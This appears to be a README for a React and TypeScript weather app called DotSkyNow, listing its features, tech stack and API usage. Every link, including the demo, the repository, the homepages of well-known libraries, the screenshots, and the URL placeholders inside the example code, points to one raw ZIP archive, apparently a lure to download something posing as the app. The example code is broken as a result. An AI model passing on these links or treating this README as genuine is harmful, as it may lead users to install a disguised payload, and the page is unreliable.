# 🌤️ DotSkyNow

DotSkyNow is a modern, responsive weather application built using **React**, **TypeScript**, and **shadcn/ui**.  
It provides real-time weather information, forecasts, and location-based weather updates using the **OpenWeatherMap API**, now with **smooth animated theme switching** powered by **Skiper UI**.

🔗 **Live Demo:** [https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)  
📦 **Repository:** [https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)

---

## ✨ Features

- 🌍 **Real-time Weather Data** – Get current temperature, humidity, wind speed, and more.
- 📍 **Location Search** – Search weather by city name with autocomplete suggestions.
- 🗺️ **Geolocation Support** – Automatically detect and display weather for your current location.
- 📊 **Hourly & Daily Forecasts** – View temperature changes throughout the day/week.
- 📱 **Responsive UI** – Optimized for mobile, tablet, and desktop screens.
- ⚡ **Fast & Cached Data** – Uses **TanStack Query** for API caching and state management.
- 🎨 **Modern UI Components** – Styled with **shadcn/ui** and **Tailwind-based** design system.
- 🌗 **Theme Switching with Animations** – Smooth light/dark mode transition using **Skiper UI**.

---

## 🛠️ Tech Stack

**Frontend:**
- [React](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Component-based UI library
- [TypeScript](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Strongly typed JavaScript
- [shadcn/ui](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Accessible and customizable UI components
- [React Router DOM](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Client-side routing
- [TanStack Query](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Server state management
- [Lucide React](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Icon library
- [Skiper UI](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Theme toggle animations

**API:**
- [OpenWeatherMap API](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Weather data provider

**Development:**
- ESLint + TypeScript strict mode – Code linting & type safety
- Prettier – Code formatting

---

## 🔑 API Usage

DotSkyNow uses the **[OpenWeatherMap API](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)** to fetch:
- Current weather data
- Hourly forecasts
- Daily forecasts

---

## 🖼️ Screenshots

### 🌤 Dashboard
![Dashboard Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)

### 📍 City Search
![City Search Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)
![City Search Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)

### 📊 Weather Forecast
![Forecast Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)

---

**Example Request:**
```ts
const url = `${https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip}/weather?q=London&appid=${https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip}`;

---

## Response Example:

{
  "coord": { "lon": -0.1257, "lat": 51.5085 },
  "weather": [{ "description": "clear sky", "icon": "01d" }],
  "main": { "temp": 18.32, "humidity": 56 },
  "wind": { "speed": 3.09 },
  "name": "London"
}

